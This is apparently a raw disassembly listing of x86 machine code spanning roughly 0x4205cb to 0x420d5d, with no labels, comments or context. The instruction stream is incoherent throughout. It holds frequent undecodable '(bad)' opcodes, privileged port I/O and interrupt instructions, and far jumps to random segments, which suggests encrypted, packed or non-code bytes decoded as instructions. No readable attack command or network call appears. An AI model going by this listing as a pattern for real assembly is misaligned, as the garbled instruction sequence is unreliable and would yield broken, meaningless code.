  4205cb:	ja     0x420552
  4205cd:	push   ds
  4205ce:	add    BYTE PTR [edx+edx*2-0x71],bh
  4205d2:	adc    ebx,DWORD PTR [edx-0x42a9de1c]
  4205d8:	xor    DWORD PTR [ebx-0x51],ebx
  4205db:	scas   al,BYTE PTR es:[edi]
  4205dc:	push   0x2b
  4205de:	sub    eax,DWORD PTR [ebp+0x49]
  4205e1:	dec    edx
  4205e2:	leave  
  4205e3:	(bad)  
  4205e5:	aam    0x3b
  4205e7:	push   ecx
  4205e8:	cmc    
  4205e9:	inc    esp
  4205ea:	sub    DWORD PTR [ecx-0x8],esp
  4205ed:	add    DWORD PTR [ebp-0x3a],ebx
  4205f0:	cmp    al,0x34
  4205f2:	aas    
  4205f3:	das    
  4205f4:	pop    es
  4205f5:	adc    eax,0x9d55f2ee
  4205fa:	sbb    eax,0x3f155ac7
  4205ff:	mov    ah,ch
  420601:	mov    al,0xe7
  420603:	or     ch,cl
  420605:	pusha  
  420606:	sub    al,0x94
  420608:	in     al,0xa2
  42060a:	shl    BYTE PTR [ebp-0x25],1
  42060d:	iret   
  42060e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42060f:	clc    
  420610:	(bad)  
  420611:	mov    ?,WORD PTR [eax-0x4ec6e264]
  420617:	sub    dl,bl
  420619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42061a:	add    al,dh
  42061c:	(bad)  
  42061d:	into   
  42061e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42061f:	fstp   DWORD PTR [esi+0x6478ba1]
  420625:	push   0x71ac1c42
  42062a:	fsubr  QWORD PTR [eax+0x18550cff]
  420630:	dec    ebp
  420631:	cli    
  420632:	mov    eax,ds:0xf699e50e
  420637:	icebp  
  420638:	sti    
  420639:	rcl    BYTE PTR [ecx+eiz*8-0x6d8eb58a],0xf5
  420641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420642:	jmp    0x7a3aa078
  420647:	adc    al,0xd9
  420649:	das    
  42064a:	stos   BYTE PTR es:[edi],al
  42064b:	pusha  
  42064c:	retf   0xa6c6
  42064f:	mov    al,0x40
  420651:	dec    ebp
  420652:	stos   DWORD PTR es:[edi],eax
  420653:	fmulp  st(6),st
  420655:	adc    bl,ah
  420657:	sub    DWORD PTR [eax+0x2563f030],ebx
  42065d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42065e:	adc    ecx,DWORD PTR [ebp+0x7b992270]
  420664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420665:	fmul   st(1),st
  420667:	in     eax,0xfa
  420669:	popa   
  42066a:	pop    es
  42066b:	(bad)  
  42066c:	mov    edi,0xdc4ad16
  420671:	cmp    ah,BYTE PTR [ecx+eiz*4+0x32]
  420675:	jle    0x420689
  420677:	data16 fimul DWORD PTR [ecx]
  42067a:	test   al,0x1e
  42067c:	adc    DWORD PTR [edi],esp
  42067e:	sahf   
  42067f:	aas    
  420680:	inc    ecx
  420681:	test   al,0xde
  420683:	add    DWORD PTR [edi-0x5184b55a],0xffffffe2
  42068a:	xlat   BYTE PTR ds:[ebx]
  42068b:	adc    esi,DWORD PTR [edx+0x55a14788]
  420691:	cwde   
  420692:	mov    edi,0x5eb13d3f
  420697:	push   0x472eb470
  42069c:	fwait
  42069d:	pop    edx
  42069e:	shr    eax,0xc4
  4206a1:	ja     0x42069d
  4206a3:	call   0x90d4:0xe8f95952
  4206aa:	leave  
  4206ab:	imul   esp,DWORD PTR [ecx],0x20
  4206ae:	xor    eax,ebp
  4206b0:	sub    esp,DWORD PTR [ecx]
  4206b2:	stos   BYTE PTR es:[edi],al
  4206b3:	(bad)  
  4206b4:	and    al,BYTE PTR [ebx+ebp*8+0x35]
  4206b8:	test   al,0x93
  4206ba:	mov    bh,0x99
  4206bc:	push   0xd2f78b91
  4206c1:	aaa    
  4206c2:	xchg   ebp,esp
  4206c4:	daa    
  4206c5:	(bad)  
  4206c6:	lock xchg esi,eax
  4206c8:	jns    0x4206b6
  4206ca:	retf   0xa3a8
  4206cd:	je     0x4206a6
  4206cf:	dec    ebx
  4206d0:	ins    BYTE PTR es:[edi],dx
  4206d1:	shl    DWORD PTR [esi-0x565b4e43],1
  4206d7:	mov    al,BYTE PTR [edx-0xe51d678]
  4206dd:	mov    edi,ebx
  4206df:	sbb    al,dl
  4206e1:	fs mov al,0x93
  4206e4:	in     al,0x26
  4206e6:	mov    edi,0xbefaf9f0
  4206eb:	sub    eax,0x2f27a52d
  4206f0:	xor    eax,0x9c65798c
  4206f5:	jp     0x4206e9
  4206f7:	jmp    0x9419bfe8
  4206fc:	push   ds
  4206fd:	pop    ebp
  4206fe:	sbb    ebp,edi
  420700:	cdq    
  420701:	or     esi,DWORD PTR [eax+0x7c]
  420704:	dec    ecx
  420705:	xor    DWORD PTR [edx+eiz*2],0xffffffda
  420709:	stos   BYTE PTR es:[edi],al
  42070a:	das    
  42070b:	adc    edi,DWORD PTR [ecx-0x799ec435]
  420711:	sbb    ebx,esi
  420713:	in     al,0x5b
  420715:	test   eax,0x482d0781
  42071a:	jmp    0x8c09:0x678a8d2d
  420721:	sbb    ecx,DWORD PTR [esi]
  420723:	inc    eax
  420724:	mov    dh,BYTE PTR [edx+0x12af7d79]
  42072a:	leave  
  42072b:	sub    eax,0x13eccc45
  420730:	cdq    
  420731:	push   ebp
  420732:	lods   eax,DWORD PTR ds:[esi]
  420733:	(bad)  
  420734:	into   
  420735:	rol    DWORD PTR [edi],1
  420737:	jge    0x4207b4
  420739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42073a:	push   ss
  42073b:	mov    eax,ds:0x2d8a3971
  420740:	mov    al,0x35
  420742:	gs jge 0x420721
  420745:	pusha  
  420746:	sub    eax,0x820ec339
  42074b:	imul   edx,DWORD PTR [edx-0x3947e748],0x75
  420752:	mov    edx,ss
  420754:	fsub   QWORD PTR [eax+eiz*8-0x3c7856aa]
  42075b:	xor    eax,0xa9403831
  420760:	push   edi
  420761:	xchg   ebp,eax
  420762:	(bad)  
  420763:	jmp    0x98ee:0x757da49d
  42076a:	retf   0x5824
  42076d:	mov    ecx,edx
  42076f:	adc    ebx,DWORD PTR [edi-0x16]
  420772:	jg     0x42071b
  420774:	out    dx,al
  420775:	push   ds
  420776:	push   ds
  420777:	push   eax
  420778:	aad    0xb
  42077a:	add    eax,0x29e9b2cd
  42077f:	jo     0x420712
  420781:	xlat   BYTE PTR ds:[ebx]
  420782:	push   ecx
  420783:	jbe    0x420797
  420785:	adc    DWORD PTR [eax+ebx*8],edi
  420788:	stos   BYTE PTR es:[edi],al
  420789:	(bad)  
  42078a:	hlt    
  42078b:	ret    
  42078c:	ins    DWORD PTR es:[edi],dx
  42078d:	sbb    al,cl
  42078f:	addr16 adc eax,0x300ed946
  420795:	mov    dl,0x2e
  420797:	scas   al,BYTE PTR es:[edi]
  420798:	mov    edi,DWORD PTR [edx-0x5a708f0a]
  42079e:	xchg   esp,eax
  42079f:	out    dx,eax
  4207a0:	mov    ecx,DWORD PTR [edx+0x50]
  4207a3:	(bad)  
  4207a4:	clc    
  4207a5:	mov    ebp,0x42ba81a2
  4207aa:	or     bh,BYTE PTR [eax+0x14159de1]
  4207b0:	ss scas al,BYTE PTR es:[edi]
  4207b2:	pop    eax
  4207b3:	jmp    0x4717:0x8628f7ed
  4207ba:	dec    ebx
  4207bb:	jmp    0xb3730cfa
  4207c0:	mov    al,0x86
  4207c2:	std    
  4207c3:	popa   
  4207c4:	cwde   
  4207c5:	stos   BYTE PTR es:[edi],al
  4207c6:	stos   BYTE PTR es:[edi],al
  4207c7:	das    
  4207c8:	adc    esi,DWORD PTR [ebx+0x66]
  4207cb:	int    0x50
  4207cd:	jmp    0x8133:0xea67bc9c
  4207d4:	inc    edx
  4207d5:	inc    ebp
  4207d6:	mov    ds:0xb74ebb6e,eax
  4207db:	mov    dl,0xc3
  4207dd:	jmp    FWORD PTR [ebx+0x4e]
  4207e0:	sub    cl,BYTE PTR [ebx+eax*2]
  4207e3:	addr16 and ah,ch
  4207e6:	xchg   esi,eax
  4207e7:	(bad)
  4207ea:	fs out dx,eax
  4207ec:	or     cl,dh
  4207ee:	enter  0xaf58,0x32
  4207f2:	rcl    esp,0x3e
  4207f5:	out    0xd2,eax
  4207f7:	dec    eax
  4207f8:	adc    ebx,DWORD PTR [ecx-0x11]
  4207fb:	or     eax,ecx
  4207fd:	imul   edx,ebx,0x3c
  420800:	mov    eax,0xfcf4f7c4
  420805:	bound  edi,QWORD PTR [edi+0x7d8e3623]
  42080b:	dec    edi
  42080c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42080d:	and    ebp,DWORD PTR [esi-0x616cf20d]
  420813:	cmp    al,0x13
  420815:	pusha  
  420816:	add    DWORD PTR [edx],esi
  420818:	mov    dh,0x53
  42081a:	(bad)  
  42081b:	clc    
  42081c:	loope  0x4207c2
  42081e:	jp     0x420815
  420820:	xor    DWORD PTR [esi+0x1d],0xffffffbf
  420824:	daa    
  420825:	mov    ebx,0x4f083cd7
  42082a:	aas    
  42082b:	out    0xcc,al
  42082d:	jmp    0xe1c1:0x3b3ecc0
  420834:	xchg   ebp,eax
  420835:	push   ds
  420836:	pop    esp
  420837:	cmp    BYTE PTR [ebp-0x36],dl
  42083a:	mov    dl,0x66
  42083c:	push   es
  42083d:	sar    BYTE PTR [edi+0x4a],0xa5
  420841:	or     bh,al
  420843:	and    DWORD PTR [ebx+ecx*1],esp
  420846:	das    
  420847:	int3   
  420848:	mov    dl,BYTE PTR [edx+edi*8]
  42084b:	lods   al,BYTE PTR ds:[esi]
  42084c:	xor    ch,0x6d
  42084f:	ds in  eax,0xdf
  420852:	sub    BYTE PTR [ecx+0xb5b0a72],bl
  420858:	aam    0xa5
  42085a:	pop    esp
  42085b:	and    eax,0xea3e2d89
  420860:	cli    
  420861:	cwde   
  420862:	push   edx
  420863:	loopne 0x4208df
  420865:	in     al,0x53
  420867:	in     eax,0x82
  420869:	mov    cl,0x26
  42086b:	push   DWORD PTR [ebp-0x1e]
  42086e:	jbe    0x420898
  420870:	sub    BYTE PTR [edi-0x733f075e],bh
  420876:	pop    ss
  420877:	push   ds
  420878:	es loopne 0x4208e8
  42087b:	mov    ss,WORD PTR [ecx+edi*8+0x4]
  42087f:	push   esp
  420880:	arpl   WORD PTR [esp+edi*8],sp
  420883:	pop    es
  420884:	xchg   ecx,eax
  420885:	push   cs
  420886:	arpl   bp,bx
  420888:	(bad)  
  420889:	dec    ebp
  42088a:	xor    ebp,DWORD PTR [ebx+0x4461c16a]
  420890:	nop
  420891:	aaa    
  420892:	inc    esp
  420893:	out    dx,eax
  420894:	scas   al,BYTE PTR es:[edi]
  420895:	daa    
  420896:	xor    bl,BYTE PTR [eax]
  420898:	jg     0x420878
  42089a:	sub    cl,BYTE PTR [ebp+edi*8-0xe]
  42089e:	retf   0xc97e
  4208a1:	rcl    BYTE PTR [ebx+0x64128ceb],1
  4208a7:	mov    ds:0x183bd9bc,al
  4208ac:	mov    dl,0xa6
  4208ae:	xor    eax,0x8b8ee560
  4208b3:	int3   
  4208b4:	pop    es
  4208b5:	pop    esi
  4208b6:	pop    ds
  4208b7:	dec    ebp
  4208b8:	shr    BYTE PTR [ebx],0x37
  4208bb:	dec    ebp
  4208bc:	test   DWORD PTR [ecx],edx
  4208be:	stos   DWORD PTR es:[edi],eax
  4208bf:	or     dh,BYTE PTR [edi-0x2]
  4208c2:	jae    0x4208d5
  4208c4:	cmp    cl,BYTE PTR [eax-0x58f67e7]
  4208ca:	sub    dh,BYTE PTR [ecx+0x78]
  4208cd:	or     al,0x87
  4208cf:	sbb    al,0x6b
  4208d1:	mov    ch,0xcb
  4208d3:	fidiv  DWORD PTR [ebp-0x46347006]
  4208d9:	loop   0x4208c8
  4208db:	ds retf 
  4208dd:	fisubr WORD PTR [eax-0x2e202219]
  4208e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208e4:	pop    esp
  4208e5:	test   DWORD PTR [edx-0x1f4fdc58],eax
  4208eb:	xchg   ecx,eax
  4208ec:	arpl   WORD PTR [ecx+0x5994c6e0],ax
  4208f2:	jle    0x420884
  4208f4:	dec    ebx
  4208f5:	xchg   edx,eax
  4208f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208f7:	push   es
  4208f8:	aad    0x3c
  4208fa:	pop    esp
  4208fb:	sub    cl,al
  4208fd:	mov    ebx,0xc05190e1
  420902:	mov    eax,esi
  420904:	stc    
  420905:	int    0x80
  420907:	mov    bl,0xbb
  420909:	test   eax,0xed2ae9fb
  42090e:	lahf   
  42090f:	inc    ebx
  420910:	stc    
  420911:	jecxz  0x4208f0
  420913:	dec    eax
  420914:	stos   DWORD PTR es:[edi],eax
  420915:	xchg   ecx,eax
  420916:	push   ebx
  420917:	mov    ebp,0x139525f7
  42091c:	push   0x42768b7c
  420921:	push   eax
  420922:	retf   
  420923:	(bad)  
  420924:	adc    eax,0x50f2c8a3
  420929:	xor    DWORD PTR [ecx+0x72696700],esi
  42092f:	fist   DWORD PTR [edx]
  420931:	ins    DWORD PTR es:[edi],dx
  420932:	in     al,0x27
  420934:	sahf   
  420935:	pop    esp
  420936:	test   DWORD PTR [ecx-0x3a],eax
  420939:	je     0x4209a9
  42093b:	cmp    edx,DWORD PTR [esi-0x5a95d391]
  420941:	nop
  420942:	sar    al,cl
  420944:	mul    BYTE PTR [edi]
  420946:	sub    al,0x1c
  420948:	add    al,0x5f
  42094a:	jbe    0x420952
  42094c:	xor    DWORD PTR [eax],ecx
  42094e:	inc    esp
  42094f:	dec    eax
  420950:	retf   
  420951:	sar    DWORD PTR [ebx+0x75],0x1b
  420955:	mov    dh,0x8f
  420957:	fisubr DWORD PTR [edi]
  420959:	sbb    BYTE PTR [esi+0x5f2062ec],ah
  42095f:	dec    ecx
  420960:	pop    ecx
  420961:	ins    BYTE PTR es:[edi],dx
  420962:	(bad)  
  420963:	es xchg edx,eax
  420965:	test   DWORD PTR [eax+0x6b],edi
  420968:	mov    ebp,0x36ac0524
  42096d:	fdiv   DWORD PTR [ebp+0x5c44421e]
  420973:	or     BYTE PTR [ecx],bh
  420975:	loopne 0x4209d5
  420977:	mov    ds:0x7280e7d6,eax
  42097c:	sbb    eax,0x99aed2e1
  420981:	pop    ecx
  420982:	sub    DWORD PTR [esi-0x36],edi
  420985:	(bad)  [ecx]
  420987:	cwde   
  420988:	jb     0x4209de
  42098a:	cwde   
  42098b:	pop    ebx
  42098c:	inc    edi
  42098d:	loope  0x4209dd
  42098f:	daa    
  420990:	stc    
  420991:	out    dx,al
  420992:	push   ebp
  420993:	add    BYTE PTR [ebx+0x6ae59dbe],cl
  420999:	in     al,dx
  42099a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42099b:	mov    bl,0x72
  42099d:	jmp    0x8edc:0x4c2706b
  4209a4:	arpl   WORD PTR [ebx+0x23],di
  4209a7:	frstor [esi-0x81dac80]
  4209ad:	dec    esp
  4209ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209af:	cmp    eax,0xed74be14
  4209b4:	test   DWORD PTR [ebx+0x75],edx
  4209b7:	rcl    BYTE PTR ss:[ebp+0x17],cl
  4209bb:	push   es
  4209bc:	hlt    
  4209bd:	jecxz  0x42096c
  4209bf:	inc    edx
  4209c0:	jb     0x4209b4
  4209c2:	jbe    0x42096b
  4209c4:	aad    0x2d
  4209c6:	and    BYTE PTR [edx-0xe],cl
  4209c9:	aad    0xf5
  4209cb:	mov    dh,0x6d
  4209cd:	mov    dl,0x77
  4209cf:	fidiv  DWORD PTR [ebx+0xa]
  4209d2:	jge    0x420a0d
  4209d4:	push   edi
  4209d6:	out    dx,al
  4209d7:	lock mov eax,ds:0x365e9b2f
  4209dd:	cs sbb dl,ah
  4209e0:	out    dx,eax
  4209e1:	test   ebx,eax
  4209e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209e4:	lods   eax,DWORD PTR ds:[esi]
  4209e5:	(bad)  
  4209e7:	std    
  4209e8:	fmul   QWORD PTR [edx+0x5f]
  4209eb:	sbb    DWORD PTR [edx+0x1fad0451],eax
  4209f1:	xor    al,BYTE PTR [eax+0x6]
  4209f4:	retf   
  4209f5:	adc    BYTE PTR [eax+0x58a798d0],ah
  4209fb:	popa   
  4209fc:	mov    ds:0x5ba52fb1,al
  420a01:	out    0x63,eax
  420a03:	xchg   esp,eax
  420a04:	call   0x4c4c:0xa2351e5c
  420a0b:	outs   dx,BYTE PTR ds:[esi]
  420a0c:	mov    bl,0xd
  420a0e:	scas   eax,DWORD PTR es:[edi]
  420a0f:	mov    al,ds:0x37a73b1d
  420a14:	fist   WORD PTR [eax-0x2d709bbb]
  420a1a:	pop    ecx
  420a1b:	sub    eax,DWORD PTR [eax+ecx*2+0x31]
  420a1f:	loopne 0x4209b4
  420a21:	push   ecx
  420a22:	and    ah,BYTE PTR [edx+0x6a]
  420a25:	ret    0x8883
  420a28:	push   ebp
  420a29:	inc    edi
  420a2a:	cmovb  esp,DWORD PTR [ebx+0x46b96fc]
  420a31:	fwait
  420a32:	fwait
  420a33:	mov    WORD PTR [ecx-0x7baae66b],cs
  420a39:	lds    ecx,FWORD PTR [edx-0x5f]
  420a3c:	icebp  
  420a3d:	loop   0x420a7d
  420a3f:	mov    bl,0xb4
  420a41:	loop   0x420a6e
  420a43:	loope  0x4209ea
  420a45:	push   ebx
  420a46:	stc    
  420a47:	cmp    esp,0x15
  420a4a:	test   BYTE PTR [eax],cl
  420a4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a4d:	jmp    0xfe8b3044
  420a52:	aam    0xa5
  420a54:	ficomp DWORD PTR [edx-0x7c]
  420a57:	ret    0x2c59
  420a5a:	pusha  
  420a5b:	xchg   ebp,eax
  420a5c:	inc    eax
  420a5d:	jbe    0x420aa1
  420a5f:	xor    eax,0x76ecf8eb
  420a64:	add    al,0x2c
  420a66:	xor    BYTE PTR [ebx],ah
  420a68:	test   DWORD PTR [edx-0x22],esi
  420a6b:	pop    es
  420a6c:	or     esp,0xf9591e56
  420a72:	adc    al,0xa2
  420a74:	clc    
  420a75:	jne    0x420a52
  420a77:	jb     0x4209fb
  420a79:	push   esp
  420a7a:	fisub  DWORD PTR [edx+ebp*2]
  420a7d:	std    
  420a7e:	push   ebx
  420a7f:	mov    esp,0x67c4d41c
  420a84:	jo     0x420a4c
  420a86:	pop    esp
  420a87:	data16 loop 0x420a26
  420a8a:	sbb    DWORD PTR [edi],0x96401e33
  420a90:	std    
  420a91:	lods   eax,DWORD PTR ds:[esi]
  420a92:	lea    ebx,[eax]
  420a94:	cld    
  420a95:	mov    fs,WORD PTR [edx-0x4f]
  420a98:	lahf   
  420a99:	sbb    BYTE PTR [edx+0x2a447762],bh
  420a9f:	lahf   
  420aa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420aa1:	jns    0x420a49
  420aa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420aa4:	out    dx,al
  420aa5:	or     bl,BYTE PTR [edx]
  420aa7:	xchg   ebx,eax
  420aa8:	sub    al,0xf0
  420aaa:	mov    bh,0x88
  420aac:	push   edi
  420aad:	into   
  420aae:	stos   DWORD PTR es:[edi],eax
  420aaf:	mov    dl,0xc5
  420ab1:	jae    0x420b06
  420ab3:	mov    esi,0xbe050774
  420ab8:	jae    0x420a71
  420aba:	sbb    eax,0xabd1a1cd
  420abf:	add    cl,cl
  420ac1:	repz push ebx
  420ac3:	mov    al,0xa3
  420ac5:	stos   BYTE PTR es:[edi],al
  420ac6:	lahf   
  420ac7:	sub    ah,BYTE PTR [ebx+ebp*8]
  420aca:	pop    ds
  420acb:	shl    BYTE PTR [ecx+eax*1+0x3e],cl
  420acf:	pop    esp
  420ad0:	push   0xfffffff4
  420ad2:	aas    
  420ad3:	sahf   
  420ad4:	and    eax,0x88e95611
  420ad9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ada:	fdiv   QWORD PTR ds:0x6a27944f
  420ae0:	add    esp,edx
  420ae2:	inc    eax
  420ae3:	or     esi,DWORD PTR [ebp+0x74c8b6d2]
  420ae9:	or     edx,DWORD PTR [eax-0x2f]
  420aec:	mov    dh,dh
  420aee:	sti    
  420aef:	lea    ebp,[eax]
  420af1:	(bad)  
  420af2:	cmp    dl,BYTE PTR [ecx]
  420af4:	cmp    BYTE PTR [edi],dl
  420af6:	sub    DWORD PTR [eax-0xaaea299],esi
  420afc:	idiv   BYTE PTR [edx+0x3ddcbdb2]
  420b02:	les    esi,FWORD PTR ds:0xd051a815
  420b08:	movups XMMWORD PTR [edi-0x73],xmm7
  420b0c:	or     ebx,DWORD PTR [eax+0x6a]
  420b0f:	(bad)
  420b12:	jp     0x420ab8
  420b14:	inc    ebp
  420b15:	jg     0x420b1d
  420b17:	mov    cs,WORD PTR [edx+esi*8]
  420b1a:	and    eax,0xe8320cd6
  420b1f:	fisttp WORD PTR [ebx]
  420b21:	cmp    al,0xbb
  420b23:	cmp    DWORD PTR [esp+edx*1+0x187c7ec0],0x39
  420b2b:	xor    al,0x9f
  420b2d:	cld    
  420b2e:	mov    esi,0x35236ca7
  420b33:	and    al,0xca
  420b35:	mov    ch,0x8
  420b37:	sbb    ch,BYTE PTR [esi]
  420b39:	sub    BYTE PTR [ebx+esi*4],cl
  420b3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b3d:	aaa    
  420b3e:	ss dec ecx
  420b40:	mov    al,0x3a
  420b42:	push   cs
  420b43:	shl    BYTE PTR [esi-0x543f047f],0x0
  420b4a:	fadd   QWORD PTR ds:0x20c9d272
  420b50:	daa    
  420b51:	sbb    bl,BYTE PTR ds:0xfeb5e8e9
  420b57:	pop    esi
  420b58:	adc    dh,BYTE PTR [ebx-0x292946a2]
  420b5e:	or     DWORD PTR [edx+0x15555f0e],edi
  420b64:	out    dx,al
  420b65:	int3   
  420b66:	or     eax,0x5ead30e2
  420b6b:	mov    al,0xe3
  420b6d:	mov    ah,BYTE PTR [esi]
  420b6f:	cmp    ch,al
  420b71:	push   edi
  420b72:	dec    eax
  420b73:	add    eax,0x17e37439
  420b78:	and    eax,0x3eb4cbb2
  420b7d:	ret    
  420b7e:	xchg   esi,eax
  420b7f:	mov    esi,0x7a56bf01
  420b84:	cmp    BYTE PTR [ebp+0x2e5a3a65],al
  420b8a:	mov    ds:0x60e002b9,eax
  420b8f:	ffree  st(1)
  420b91:	jbe    0x420b1a
  420b93:	sahf   
  420b94:	sub    edx,DWORD PTR [edx+0x7ba6db4]
  420b9a:	jnp    0x420be4
  420b9c:	xchg   ebp,eax
  420b9d:	push   es
  420b9e:	ret    
  420b9f:	or     al,0xf0
  420ba1:	call   0xc1813992
  420ba6:	inc    ebp
  420ba7:	add    bh,BYTE PTR [eax+0x7c764b68]
  420bad:	xor    eax,esp
  420baf:	mov    ebp,0x654c6e38
  420bb4:	pop    esi
  420bb5:	addr16 popf 
  420bb7:	mov    ebx,0xead3fd8
  420bbc:	imul   ebx,esi,0x68
  420bbf:	dec    edi
  420bc0:	in     al,dx
  420bc1:	stos   BYTE PTR es:[edi],al
  420bc2:	jno    0x420bdc
  420bc4:	lds    edi,FWORD PTR [ebp+0x140990bc]
  420bca:	or     DWORD PTR [esp+ecx*8],ebx
  420bcd:	fld    st(1)
  420bcf:	pop    esi
  420bd0:	mov    ecx,0x58b8d1b2
  420bd5:	pinsrw mm3,WORD PTR [edi],0xb4
  420bd9:	mov    ebp,0x7a1cc71d
  420bde:	ror    DWORD PTR [esi+0x67],0xff
  420be2:	test   eax,0xac4002c5
  420be7:	(bad)  [ecx-0x7252ec15]
  420bed:	data16 hlt 
  420bef:	xlat   BYTE PTR ds:[ebx]
  420bf0:	add    al,0xb5
  420bf2:	or     eax,0xa546c7c4
  420bf7:	outs   dx,DWORD PTR ds:[esi]
  420bf8:	sub    bh,ah
  420bfa:	sub    al,0xb9
  420bfc:	cs pop ds
  420bfe:	fdiv   DWORD PTR [ecx]
  420c00:	call   0x55f673c6
  420c05:	outs   dx,BYTE PTR ds:[esi]
  420c06:	jmp    0xa97753f8
  420c0b:	or     ebx,DWORD PTR gs:[ecx+0x50]
  420c0f:	mov    DWORD PTR [ebx+0x3a],eax
  420c12:	dec    esi
  420c13:	dec    esp
  420c14:	stc    
  420c15:	cmp    bh,BYTE PTR [ecx]
  420c17:	jo     0x420c22
  420c19:	daa    
  420c1a:	mov    ds:0xb542f905,eax
  420c1f:	adc    ah,al
  420c21:	push   cs
  420c22:	cmp    eax,0xc2f1b853
  420c27:	fld    TBYTE PTR [ebx-0x47250443]
  420c2d:	mov    al,0xe1
  420c2f:	fucomi st,st(0)
  420c31:	inc    eax
  420c32:	fadd   DWORD PTR [ebx-0x10318de0]
  420c38:	xchg   edx,eax
  420c39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c3a:	mov    bl,0x60
  420c3c:	imul   edx,DWORD PTR [edi],0xffffffbc
  420c3f:	sbb    dh,al
  420c41:	repz arpl WORD PTR [ebx-0x4],bp
  420c45:	scas   al,BYTE PTR es:[edi]
  420c46:	pop    ebp
  420c47:	push   ebp
  420c48:	mov    ch,0xc
  420c4a:	mov    eax,ds:0x9de9edcb
  420c4f:	sbb    dh,bl
  420c51:	mov    db3,edx
  420c54:	not    ebx
  420c56:	xchg   esi,eax
  420c57:	lahf   
  420c58:	dec    edx
  420c59:	cmp    BYTE PTR [eax],cl
  420c5b:	adc    bl,ch
  420c5d:	or     eax,edx
  420c5f:	sub    al,0xab
  420c61:	push   esp
  420c62:	sbb    esi,esi
  420c64:	(bad)  
  420c65:	stos   DWORD PTR es:[edi],eax
  420c66:	dec    ecx
  420c67:	jbe    0x420c60
  420c69:	sbb    edi,DWORD PTR [edi+edx*1-0x614def18]
  420c70:	push   ss
  420c71:	cs cdq 
  420c73:	ror    BYTE PTR [ebx],1
  420c75:	dec    esi
  420c76:	add    cl,bh
  420c78:	(bad)  
  420c79:	sub    al,0x67
  420c7b:	dec    esi
  420c7c:	push   es
  420c7d:	lock mov eax,0x8cf5dab2
  420c83:	xchg   ecx,eax
  420c84:	fstp   TBYTE PTR ds:0x85f35bde
  420c8a:	js     0x420ccd
  420c8c:	int3   
  420c8d:	and    al,0x6e
  420c8f:	add    eax,0x7d264bbc
  420c94:	pop    edx
  420c95:	add    eax,0x2e8a3088
  420c9a:	outs   dx,BYTE PTR ds:[esi]
  420c9b:	mov    ecx,0xe5650fdb
  420ca0:	or     eax,0xe32e2810
  420ca5:	fstp   TBYTE PTR [eax-0x3a479df8]
  420cab:	jp     0x420cff
  420cad:	pusha  
  420cae:	or     BYTE PTR [ebx],dh
  420cb0:	add    esi,DWORD PTR [esi-0x3d]
  420cb3:	dec    esi
  420cb4:	test   DWORD PTR [ebx+esi*1-0x11951a8e],esp
  420cbb:	mov    edx,0xcc13acd
  420cc0:	cmc    
  420cc1:	cmp    al,0xb5
  420cc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cc4:	xchg   edx,eax
  420cc5:	hlt    
  420cc6:	bound  esi,QWORD PTR [esi-0x74]
  420cc9:	out    dx,al
  420cca:	adc    DWORD PTR [edi+0x13],0xffa857b7
  420cd1:	push   0xffffffdf
  420cd3:	sti    
  420cd4:	sub    eax,0xa7685989
  420cd9:	into   
  420cda:	clc    
  420cdb:	adc    al,0x24
  420cdd:	inc    ecx
  420cde:	stc    
  420cdf:	pand   mm5,QWORD PTR [edx+ebp*4]
  420ce3:	mov    ds:0x296c75a8,eax
  420ce8:	xchg   esp,eax
  420ce9:	push   ss
  420cea:	xor    cl,BYTE PTR [esi+0x21]
  420ced:	dec    ebx
  420cee:	lods   al,BYTE PTR ds:[esi]
  420cef:	lahf   
  420cf0:	and    al,BYTE PTR [edi-0x1a]
  420cf3:	out    0xb2,eax
  420cf5:	dec    edi
  420cf6:	mov    eax,0x8858ec9c
  420cfb:	xchg   ecx,eax
  420cfc:	retf   
  420cfd:	and    eax,0xd9488907
  420d02:	std    
  420d03:	jp     0x420d74
  420d05:	stos   DWORD PTR es:[edi],eax
  420d06:	cmp    eax,eax
  420d08:	lods   eax,DWORD PTR ds:[esi]
  420d09:	arpl   sp,bx
  420d0b:	or     esi,DWORD PTR [edx-0x56]
  420d0e:	outs   dx,DWORD PTR ds:[esi]
  420d0f:	mov    cl,0xcc
  420d11:	stos   BYTE PTR es:[edi],al
  420d12:	cmp    ebx,DWORD PTR ds:0x52dd0903
  420d18:	loop   0x420cd9
  420d1a:	(bad)  
  420d1b:	and    al,0x4
  420d1d:	scas   eax,DWORD PTR es:[edi]
  420d1e:	pushf  
  420d1f:	pop    edi
  420d20:	mov    cl,0x43
  420d22:	int3   
  420d23:	data16 xlat BYTE PTR ds:[ebx]
  420d25:	xchg   ebp,eax
  420d26:	ins    DWORD PTR es:[edi],dx
  420d27:	push   ss
  420d28:	call   0xee86fc68
  420d2d:	sbb    al,0xe5
  420d2f:	push   ebp
  420d31:	fld    DWORD PTR [esi+0xe8e2d19]
  420d37:	or     al,0x9f
  420d39:	mov    esp,0xa337f6da
  420d3e:	add    dl,BYTE PTR [edi-0x6c]
  420d41:	(bad)  
  420d42:	adc    esp,DWORD PTR [ebx+0x79]
  420d45:	cmp    al,bh
  420d47:	mov    DWORD PTR [ecx+0x5e],0x1559f5e4
  420d4e:	dec    esi
  420d4f:	repz fwait
  420d51:	jnp    0x420cf1
  420d53:	js     0x420d98
  420d55:	push   eax
  420d56:	fnstcw WORD PTR [edx+0xdb5fc5e]
  420d5c:	dec    ecx
  420d5d:	push   esi
